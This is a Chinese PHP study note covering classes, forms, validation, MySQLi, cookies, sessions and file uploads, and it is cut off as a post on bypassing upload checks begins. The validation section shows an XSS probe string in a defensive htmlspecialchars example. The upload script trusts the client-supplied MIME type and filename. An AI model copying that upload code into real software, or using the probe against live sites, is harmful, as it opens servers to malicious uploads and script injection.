其中 var相当于是 public的别名；函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问
php中创建对象创建完类后，可以使用new运算符来实例化该类的对象 $runoob=new Site;
调用成员方法在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量
以下为上述三种的完整代码例子：
&lt;?phpclass Site&#123;    //成员变量    var $url;    var $title;    //成员函数    function setUrl($par)&#123;        $this-&gt;url=$par;    &#125;    function getUrl()&#123;        echo $this-&gt;url .PHP_EOL;    &#125;    function setTitle($par)&#123;        $this-&gt;title=$par;    &#125;    function getTitle()&#123;        echo $this-&gt;title.PHP_EOL;    &#125;&#125;$runoob=new Site;$taobao=new Site;$google=new Site;//调用成员函数$runoob-&gt;setTitle(&quot;菜鸟教程&quot;);$taobao-&gt;setTitle(&quot;淘宝&quot;);$google-&gt;setTitle(&quot;Google 搜索&quot;);$runoob-&gt;setUrl(&#x27;www.runoob.com&#x27;);$taobao-&gt;setUrl(&#x27;www.taobao.com&#x27;);$google-&gt;setUrl(&#x27;www.google.com&#x27;);//调用成员函数，获得标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;

PHP_EOL 是文本换行，并不是 html 换行
如果想在网页里面做到换行：一种是在最前面加上 echo &quot;&lt;pre&gt;&quot;做文本格式化处理；另一种是将PHP_EOL改成”
php构造函数主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。
允许在一个类中定义一个方法作为构造函数，语法格式如下
void __construct([ mixed $args [, $...]])

例子：初始化$url和$title变量
function __construct( $par1, $par2 ) &#123;   $this-&gt;url = $par1;   $this-&gt;title = $par2;&#125;

可以将上面得代码精简如下
&lt;?phpclass Site&#123;    //成员变量    var $url;    var $title;    function __construct($par1,$par2)&#123;        $this-&gt;url=$par1;        $this-&gt;title=$par2;    &#125;    //成员函数    function setUrl($par)&#123;        $this-&gt;url=$par;    &#125;    function getUrl()&#123;        echo $this-&gt;url .PHP_EOL;    &#125;    function setTitle($par)&#123;        $this-&gt;title=$par;    &#125;    function getTitle()&#123;        echo $this-&gt;title.PHP_EOL;    &#125;&#125;$runoob=new Site(&#x27;www.runoob.com&#x27;,&#x27;菜鸟教程&#x27;);$taobao=new Site(&#x27;www.taobao.com&#x27;,&#x27;淘宝&#x27;);$google=new Site(&#x27;ww.google.com&#x27;,&#x27;Google 搜索&#x27;);//调用成员函数，获得标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;

析构函数当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数
语法：void __destruct(void)
&lt;?phpclass MyDestructableClass &#123;   function __construct() &#123;       print &quot;构造函数\n&quot;;       $this-&gt;name = &quot;MyDestructableClass&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁 &quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new MyDestructableClass();?&gt;

继承使用extends来继承一个类（并可以扩展其功能），语法格式如下
class Child extends Parent&#123;	//代码部分&#125;

方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。下面为gerUrl方法得重写
function getUrl()&#123;	echo $this-&gt;url . PHP_EOL;	return $this-&gt;url;&#125;

访问控制PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。

public（公有）：公有的类成员可以在任何地方被访问。
protected（受保护）：受保护的类成员则只能被其类自身以及其子类和父类访问中访问，就是说要在类中构造一些公有的函数来使用受保护的对象。
private（私有）：私有的类成员则只能被其定义所在的类访问（定义公用的函数来进行使用）。

属性的访问控制
类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有
方法的访问控制
类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。
接口使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。
接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。
接口中定义的所有方法都必须是公有，这是接口的特性。
要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。（下面这段代码好好理解，懂了差不多就懂了接口怎么用）
&lt;?phpinterface Animal &#123;public function call();public function run();&#125;class HasName &#123;protected $name = &#x27;name&#x27;;public function getName() &#123;return $this-&gt;name;&#125;&#125;class Cat extends HasName implements Animal &#123;protected $name = &#x27;cat&#x27;;public function call() &#123;echo $this-&gt;getName() . &#x27;: 喵喵叫～&#x27; . PHP_EOL;&#125;public function run() &#123;echo $this-&gt;getName() . &#x27;在跑～&#x27; . PHP_EOL;&#125;&#125;class Dog extends HasName implements Animal &#123;protected $name = &#x27;dog&#x27;;public function call() &#123;echo $this-&gt;getName() . &#x27;: 汪汪叫～&#x27; . PHP_EOL;&#125;public function run() &#123;echo $this-&gt;getName() . &#x27;在跑～&#x27; . PHP_EOL;&#125;&#125;

输出的结果为：
cat: 喵喵叫～cat在跑～dog: 汪汪叫～dog在跑～

常量可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。
常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。
&lt;?phpclass MyClass&#123;    const constant=&#x27;常量值&#x27;;    function showConstant()&#123;        echo self::constant. PHP_EOL;    &#125;&#125;echo MyClass::constant . PHP_EOL;$classname=&quot;MyClass&quot;;echo $classname::constant. PHP_EOL;$class=new MyClass();$class-&gt;showConstant();echo $class::constant. PHP_EOL;?&gt;

抽象类任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。
定义为抽象的类不能被实例化。
被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。
继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。
&lt;?phpabstract class AbstractClass   //abstract定义抽象类&#123; // 强制要求子类定义这些方法    abstract protected function getValue();    abstract protected function prefixValue($prefix);    // 普通方法（非抽象方法）    public function printOut() &#123;        print $this-&gt;getValue() . PHP_EOL;    &#125;&#125;class ConcreteClass1 extends AbstractClass&#123;    protected function getValue() &#123;        return &quot;ConcreteClass1&quot;;    &#125;    public function prefixValue($prefix) &#123;        return &quot;&#123;$prefix&#125;ConcreteClass1&quot;;    &#125;&#125;class ConcreteClass2 extends AbstractClass&#123;    public function getValue() &#123;        return &quot;ConcreteClass2&quot;;    &#125;    public function prefixValue($prefix) &#123;        return &quot;&#123;$prefix&#125;ConcreteClass2&quot;;    &#125;&#125;$class1 = new ConcreteClass1;$class1-&gt;printOut();echo $class1-&gt;prefixValue(&#x27;FOO_&#x27;) . PHP_EOL;$class2 = new ConcreteClass2;$class2-&gt;printOut();echo $class2-&gt;prefixValue(&#x27;FOO_&#x27;) . PHP_EOL;?&gt;

输出结果为
ConcreteClass1FOO_ConcreteClass1ConcreteClass2FOO_ConcreteClass2

子类方法还可以包含父类抽象方法中不存在的可选参数
static关键字声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。
静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。
由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。
静态属性不可以由对象通过 -&gt; 操作符来访问。
&lt;?phpclass Foo &#123;  public static $my_static = &#x27;foo&#x27;;   public function staticValue() &#123;     return self::$my_static;  &#125;&#125;print Foo::$my_static . PHP_EOL;$foo = new Foo();print $foo-&gt;staticValue() . PHP_EOL;?&gt;    

self引用自身变量或者方法
Final关键字如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。
final public function moreTesting()&#123;    &#125;

调用父类构造方法PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 。
&lt;?phpclass BaseClass &#123;   function __construct() &#123;       print &quot;BaseClass 类中构造方法&quot; . PHP_EOL;   &#125;&#125;class SubClass extends BaseClass &#123;   function __construct() &#123;       parent::__construct();  // 子类构造方法不能自动调用父类的构造方法       print &quot;SubClass 类中构造方法&quot; . PHP_EOL;   &#125;&#125;class OtherSubClass extends BaseClass &#123;    // 继承 BaseClass 的构造方法&#125;// 调用 BaseClass 构造方法$obj = new BaseClass();// 调用 BaseClass、SubClass 构造方法$obj = new SubClass();// 调用 BaseClass 构造方法$obj = new OtherSubClass();?&gt;

输出的结果
BaseClass 类中构造方法BaseClass 类中构造方法SubClass 类中构造方法BaseClass 类中构造方法

php表单php表单和用户输入php下拉表单菜单单选
以下实例我们设置了下拉菜单三个选项，表单使用 GET 方式获取数据，action 属性值为空表示提交到当前脚本，我们可以通过 select 的 name 属性获取下拉菜单的值：
&lt;?php$q = isset($_GET[&#x27;q&#x27;])? htmlspecialchars($_GET[&#x27;q&#x27;]) : &#x27;&#x27;;if($q) &#123;        if($q ==&#x27;RUNOOB&#x27;) &#123;                echo &#x27;菜鸟教程&lt;br&gt;http://www.runoob.com&#x27;;        &#125; else if($q ==&#x27;GOOGLE&#x27;) &#123;                echo &#x27;Google 搜索&lt;br&gt;http://www.google.com&#x27;;        &#125; else if($q ==&#x27;TAOBAO&#x27;) &#123;                echo &#x27;淘宝&lt;br&gt;http://www.taobao.com&#x27;;        &#125;&#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;     &lt;select name=&quot;q&quot;&gt;    &lt;option value=&quot;&quot;&gt;选择一个站点:&lt;/option&gt;    &lt;option value=&quot;RUNOOB&quot;&gt;Runoob&lt;/option&gt;    &lt;option value=&quot;GOOGLE&quot;&gt;Google&lt;/option&gt;    &lt;option value=&quot;TAOBAO&quot;&gt;Taobao&lt;/option&gt;    &lt;/select&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;?php&#125;?&gt;

php下拉菜单多选
如果下拉菜单是多选的（ multiple&#x3D;”multiple”），我们可以通过将设置 select name&#x3D;”q[]” 以数组的方式获取
&lt;select multiple=&quot;multiple&quot; name=&quot;q[]&quot;&gt;

单选按钮表单
PHP 单选按钮表单中 name 属性的值是一致的，value 值是不同的
&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;     &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;RUNOOB&quot; /&gt;Runoob    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;GOOGLE&quot; /&gt;Google    &lt;input type=&quot;radio&quot; name=&quot;q&quot; value=&quot;TAOBAO&quot; /&gt;Taobao    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;

checkbox 复选框
可以选择多个值
&lt;?php$q = isset($_POST[&#x27;q&#x27;])? $_POST[&#x27;q&#x27;] : &#x27;&#x27;;if(is_array($q)) &#123;    $sites = array(            &#x27;RUNOOB&#x27; =&gt; &#x27;菜鸟教程: http://www.runoob.com&#x27;,            &#x27;GOOGLE&#x27; =&gt; &#x27;Google 搜索: http://www.google.com&#x27;,            &#x27;TAOBAO&#x27; =&gt; &#x27;淘宝: http://www.taobao.com&#x27;,    );    foreach($q as $val) &#123;        // PHP_EOL 为常量，用于换行        echo $sites[$val] . PHP_EOL;    &#125;      &#125; else &#123;?&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;RUNOOB&quot;&gt; Runoob&lt;br&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;GOOGLE&quot;&gt; Google&lt;br&gt;     &lt;input type=&quot;checkbox&quot; name=&quot;q[]&quot; value=&quot;TAOBAO&quot;&gt; Taobao&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php&#125;?&gt;

php表单验证
如何避免$_SERVER[“PHP_SELF”]被利用
$_SERVER[“PHP_SELF”] 可以通过 htmlspecialchars() 函数来避免被利用。
form 代码如下所示：
&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;

htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。现在如果用户想利用 PHP_SELF 变量, 结果将输出如下所示：
&lt;form method=&quot;post&quot; action=&quot;test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;hacked&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;

尝试该漏洞失败！
php表单—必须字段在以下代码中我们加入了一些新的变量: $nameErr, $emailErr, $genderErr, 和 $websiteErr.。这些错误变量将显示在必需字段上。 我们还为每个$_POST变量增加了一个if else语句。 这些语句将检查 $_POST 变量是 否为空（使用php的 empty() 函数）。如果为空，将显示对应的错误信息。 如果不为空，数据将传递给test_input() 函数：
&lt;?php// 定义变量并默认设为空值$nameErr = $emailErr = $genderErr = $websiteErr = &quot;&quot;;$name = $email = $gender = $comment = $website = &quot;&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;  if (empty($_POST[&quot;name&quot;])) &#123;    $nameErr = &quot;名字是必需的。&quot;;  &#125; else &#123;    $name = test_input($_POST[&quot;name&quot;]);  &#125;  if (empty($_POST[&quot;email&quot;])) &#123;    $emailErr = &quot;邮箱是必需的。&quot;;  &#125; else &#123;    $email = test_input($_POST[&quot;email&quot;]);  &#125;  if (empty($_POST[&quot;website&quot;])) &#123;    $website = &quot;&quot;;  &#125; else &#123;    $website = test_input($_POST[&quot;website&quot;]);  &#125;  if (empty($_POST[&quot;comment&quot;])) &#123;    $comment = &quot;&quot;;  &#125; else &#123;    $comment = test_input($_POST[&quot;comment&quot;]);  &#125;  if (empty($_POST[&quot;gender&quot;])) &#123;    $genderErr = &quot;性别是必需的。&quot;;  &#125; else &#123;    $gender = test_input($_POST[&quot;gender&quot;]);  &#125;&#125;?&gt;

php-显示错误信息
我为每个字段中添加了一些脚本， 各个脚本会在信息输入错误时显示错误信息
验证邮件和URLphp-验证名称
以下代码将通过简单的方式来检测 name 字段是否包含字母和空格，如果 name 字段值不合法，将输出错误信息
$name = test_input($_POST[&quot;name&quot;]);if (!preg_match(&quot;/^[a-zA-Z ]*$/&quot;,$name)) &#123;  $nameErr = &quot;只允许字母和空格&quot;; &#125;

补充
（1）preg_match — 进行正则表达式匹配。
语法：int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )
在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推
（2）if(!a)的意思是如果变量a的值为假（或者0、null、””空值），则执行if语句后面的代码块。这里的”!”是一个逻辑非运算符，可以将真值变为假，假值变为真。所以，如果a是真值，那么!a就是假值；如果a是假值，那么!a就是真值。
验证邮件
$email = test_input($_POST[&quot;email&quot;]);if (!preg_match(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)) &#123;  $emailErr = &quot;非法邮箱格式&quot;; &#125;

验证URL
$website = test_input($_POST[&quot;website&quot;]);if (!preg_match(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website)) &#123;  $websiteErr = &quot;非法的 URL 的地址&quot;; &#125;

$_GET变量预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。
从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。
在 HTML 表单中使用 method&#x3D;”get” 时，所有的变量名和值都会显示在 URL 中。
注释：所以在发送密码或其他敏感信息时，不应该使用这个方法！
然而，正因为变量显示在 URL 中，因此可以在收藏夹中收藏该页面。在某些情况下，这是很有用的。
注释：HTTP GET 方法不适合大型的变量值。它的值是不能超过 2000 个字符的
$_POST变量预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。
从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。
注释：然而，默认情况下，POST 方法的发送信息的量最大值为 8 MB（可通过设置 php.ini 文件中的 post_max_size 进行更改）
$_REQUEST 变量预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容。
$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据
php数据库数据库使用完后要记得关闭连接
面向对象：$conn-&gt;close();
面向过程：mysqli_close($conn);
连接MySQL


servername
可选。规定要连接的服务器。默认是 “localhost:3306”。



username
可选。规定登录所使用的用户名。默认值是拥有服务器进程的用户的名称。


password
可选。规定登录所用的密码。默认是 “”


面向过程
&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // 创建连接$conn = mysqli_connect($servername, $username, $password); // 检测连接if (!$conn) &#123;    die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;连接成功&quot;;?&gt;

想连接到数据库就是在password后面再加就可以了
$conn = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ez_sql&quot;);

插入数据语法
$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;; if (mysqli_query($conn, $sql)) &#123;    echo &quot;新记录插入成功&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($conn);&#125;

插入多条数据
mysqli_multi_query() 函数可用来执行多条SQL语句
例子：
$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;);&quot;;$sql .= &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;Mary&#x27;, &#x27;Moe&#x27;, &#x27;mary@example.com&#x27;);&quot;;$sql .= &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;Julie&#x27;, &#x27;Dooley&#x27;, &#x27;julie@example.com&#x27;)&quot;; if ($conn-&gt;multi_query($sql) === TRUE) &#123;    echo &quot;新记录插入成功&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;

预处理语句函数mysqli_stmt_bind_param() 
该函数绑定参数查询并将参数传递给数据库，第二个参数是 “sss” ，
参数可以是这四种形式：i-整数；d-双精度浮点数；s-字符串；b-二进制blob存储对象
每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险
$stmt-&gt;get_result()
这是一个用于从执行预处理语句后获取结果集的函数。在 PHP 中，使用 MySQLi 进行数据库操作时，如果使用预处理语句执行了一个查询，你可以通过 $stmt-&gt;get_result() 来获取这个查询的结果集。
这个函数通常在执行 SELECT 查询并且绑定了结果变量后使用。例子如下：
// 假设已经准备好了数据库连接 $conn 和预处理语句 $stmt// 执行预处理语句$stmt-&gt;execute();// 获取查询结果集$res = $stmt-&gt;get_result();// 处理结果集while ($row = $res-&gt;fetch_assoc()) &#123;    // 处理每一行数据    // $row 是一个关联数组，包含了查询结果中的一行数据    echo $row[&#x27;column_name&#x27;] . &quot;&lt;br&gt;&quot;;&#125;

在这个示例中，$stmt-&gt;get_result() 用于获取执行预处理语句后得到的结果集。然后，使用 fetch_assoc() 方法逐行获取结果集中的数据。

预处理的优点：

预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。
绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。
预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。


下面为对以上代码的分析
prepare() &#x2F; mysqli_prepare() 函数用于准备一条SQL语句以供执行。
$mysqli -&gt; prepare(query) #面向对象的风格


&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;

可以将问号替换为整型，字符串，双精度浮点型和布尔值
$stmt-&gt;execute()

这行代码可以检查预编译语句是否执行，若执行了则会返回不为0的布尔值
从数据库中读取数据$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) &gt; 0) &#123;    // 输出数据    while($row = mysqli_fetch_assoc($result)) &#123;        echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - Name: &quot; . $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 结果&quot;;&#125;

分析：函数 mysqli_num_rows()判断返回的数据
​			mysqli_fetch_assoc()将结果集放入到关联数组并循环输出
​			mysqli_query() 函数，该函数用于向 MySQL 连接发送查询或命令
页面跳转使用 header函数
例子
if ($stmt-&gt;execute()) &#123;        // 注册成功后进行页面跳转        header(&quot;Location:http://localhost:3000/index.php&quot;); // 重定向到注册成功页面        exit; // 重定向后加上 exit 终止当前脚本执行    &#125; else &#123;        echo &quot;数据插入失败&quot;;    &#125;

注解：header里面的Locatio是必须要有的， Location 头来指定重定向的地址
Cookie与SessionCookiecookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。
setcookie()函数
该函数用于设置cookie;setcookie() 函数必须位于  标签之前
语法： setcokie(name,value,expire,path,domain);
注释：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码。（为防止 URL 编码，请使用 setrawcookie() 取而代之。）
例子：过期时间被设为一个月
&lt;?php$expire=time()+60*60*24*30;setcookie(&quot;user&quot;, &quot;runoob&quot;, $expire);?&gt;&lt;html&gt;.....

取回Cookie的值
$_COOKIE变量用于取回cookie的值
&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt;

删除Cookie
就是要把过期的时间变更为过去的时间点
&lt;?php// 设置 cookie 过期时间为过去 1 小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt;

SessionPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的
开始php session
在您把用户信息存储到 PHP session 中之前，首先必须启动会话。
注释：session_start() 函数必须位于  标签之前：
&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;

存储Session变量
存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量：
&lt;?phpsession_start();// 存储 session 数据$_SESSION[&#x27;views&#x27;]=1;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php// 检索 session 数据echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];?&gt;&lt;/body&gt;&lt;/html&gt;

销毁Session
如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。
unset() 函数用于释放指定的 session 变量：
&lt;?phpsession_start();if(isset($_SESSION[&#x27;views&#x27;]))&#123;    unset($_SESSION[&#x27;views&#x27;]);&#125;?&gt;

seesion_destroy()函数彻底销毁session:
&lt;?php session_destroy();?&gt;

注释：session_destroy() 将重置 session，您将失去所有已存储的 session 数据。
文件上传先创建一个文件上传表单：
&lt;html&gt;&lt;body&gt;&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 "multipart/form-data"。

 标签的 type&#x3D;”file” 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。
再创建一个上传脚本：
&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)  &#123;  echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;  &#125;else  &#123;  echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;  echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;  echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;  echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];  &#125;?&gt;

通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。
第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：
$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称$_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型$_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称$_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码

上传限制
在下面这个脚本中，增加了对文件上传的限制。用户只能上传 .gif 或 .jpeg 文件，文件大小必须小于 20 kb：
&lt;?phpif ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))  &#123;  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)    &#123;    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;    &#125;  else    &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;    echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    &#125;  &#125;else  &#123;  echo &quot;Invalid file&quot;;  &#125;?&gt;

上面这个例子会在服务器的 PHP 临时文件夹创建了一个被上传文件的临时副本，这个临时的复制文件会在脚本结束时消失
保存被上传的文件
&lt;?phpif ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))  &#123;  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)    &#123;    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;    &#125;  else    &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))      &#123;      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;      &#125;    else      &#123;      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],      &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);      echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];      &#125;    &#125;  &#125;else  &#123;  echo &quot;Invalid file&quot;;  &#125;?&gt;

上面的脚本检测了是否已存在此文件，如果不存在，则把文件拷贝到指定的文件夹
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传学习</title>
    <url>/2024/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0_max/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[前端检测主要是通过javascript代码进行检测，非常容易进行绕过。
